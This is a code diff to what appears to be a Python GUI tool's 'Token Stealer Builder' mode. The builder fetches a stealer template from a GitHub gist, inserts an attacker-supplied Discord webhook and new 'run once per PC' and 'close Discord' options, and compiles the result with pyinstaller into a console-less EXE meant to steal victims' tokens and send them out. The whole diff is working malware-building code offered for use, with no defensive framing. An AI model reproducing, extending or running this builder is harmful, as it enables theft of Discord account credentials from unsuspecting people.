@@ -1372,49 +1372,58 @@ elif mode == "StealerBuilder":
         global useicon
         global icon
         global Window
-        os.chdir('RTBStealerBuilder/')
-        pyname = name+'.py'
-        temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/2eb4210c0fa37a5f0bc2462c0a960fe6eaf2e307/stealertemplate.py").text
-        with open("template.py", "w+") as handle:
-            handle.write(temp)
-        with open("template.py") as f:
-            lines = f.readlines()
-        os.remove("template.py")
-        with open(pyname, "w") as f:
-            lines.insert(12, "webhook = '{}'\n".format(webhook))
-            f.write("".join(lines))
-        print("Building EXE, Please wait...")
-        window.Refresh()
-        if useicon:
-            compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'--icon='+icon,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
+        global runonce
+        global killdisc
+        e = subprocess.call(['pyinstaller','-h'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
+        if e == 1:
+            print("Pyinstaller is not installed!")
+            window.Refresh()
         else:
-            compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
-        compiling.wait()
-        print("EXE built, Cleaning up...")
-        window.Refresh()
-        shutil.rmtree('build')
-        for root, dirs, files in os.walk('dist'):
-            for file in files:
-                if file == ('{}.exe'.format(name)):
-                    os.rename('dist/{}'.format(file), '{}.exe.'.format(name))
-        shutil.rmtree('dist')
-        os.remove('{}.spec'.format(name))
-        print("Finished!")
-        window.Refresh()
+            os.chdir('RTBStealerBuilder/')
+            pyname = name+'.py'
+            temp = requests.get("https://gist.githubusercontent.com/DeadBread76/33bebc13ac454b76961cb7797c941a92/raw/050466a1965847c423e24d0d59574c8a4ad97ad9/stealertemplate.py").text
+            with open("template.py", "w+") as handle:
+                handle.write(temp)
+            with open("template.py") as f:
+                lines = f.readlines()
+            os.remove("template.py")
+            with open(pyname, "w") as f:
+                lines.insert(12, "runonce = {}\nkilldisc = {}\nh = '{}'\n".format(str(runonce), str(killdisc), webhook))
+                f.write("".join(lines))
+            print("Building EXE, Please wait...")
+            window.Refresh()
+            if useicon:
+                compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'--icon='+icon,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
+            else:
+                compiling = subprocess.Popen(['pyinstaller','--noconsole',pyname,'-F'],shell=True,stdout=open("../errors.log", "a"), stderr=subprocess.STDOUT)
+            compiling.wait()
+            print("EXE built, Cleaning up...")
+            window.Refresh()
+            shutil.rmtree('build')
+            for root, dirs, files in os.walk('dist'):
+                for file in files:
+                    if file == ('{}.exe'.format(name)):
+                        os.rename('dist/{}'.format(file), '{}.exe.'.format(name))
+            shutil.rmtree('dist')
+            os.remove('{}.spec'.format(name))
+            print("Finished!")
+            window.Refresh()
     layout = [
             [sg.Text('Output Name', size=(10, 1)), sg.Input(size=(10, 1))],
             [sg.Text('Webhook', size=(10, 1)), sg.Input(size=(50, 1)), sg.Checkbox('Use Icon?')],
-            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1)), sg.FileBrowse(button_color=theme['button_colour'])],
-            [sg.Output(size=(80, 20))],
+            [sg.Text('Icon', size=(10, 1)), sg.InputText(size=(50, 1)), sg.FileBrowse(button_color=theme['button_colour'], file_types=(("Icon Files", "*.ico"),("All Files", "*.*")))],
+            [sg.Text('Run Once Per PC', size=(13, 1)), sg.Combo(['True','False'], default_value="True", key="Run", tooltip="Only Run once per PC to prevent spam.", readonly=True), sg.Text('Close Discord', size=(10, 1)), sg.Combo(['True','False'], default_value="False", key="Close", tooltip="Close Discord on Run. (NOT STEALTHY)", readonly=True)],
+            [sg.Output(size=(80, 15))],
             [sg.Button('Build', size=(35, 1), button_color=theme['button_colour']), sg.Exit(size=(35, 1), button_color=theme['button_colour'])]
             ]
-    window = sg.Window("DeadBread's Token Stealer Builder v 0.1.1", layout)
-
+    window = sg.Window("RTB | DeadBread's Token Stealer Builder v 0.2.0", layout)
     while True:
-        event, values = window.Read()
-        if event is None or event == 'Exit':
+        event, values = window.Read(timeout=0)
+        if event is None:
             break
-        if event == "Build":
+        elif event == sg.TIMEOUT_KEY:
+            window.Refresh()
+        elif event == "Build":
             if values[0] == '':
                 sg.PopupNonBlocking('Invalid Name!')
                 continue
@@ -1425,6 +1434,8 @@ elif mode == "StealerBuilder":
             webhook = base64.b64encode(values[1].encode()).decode()
             useicon = values[2]
             icon = values[3]
+            runonce = values['Run']
+            killdisc = values['Close']
             build()
     window.Close()
 
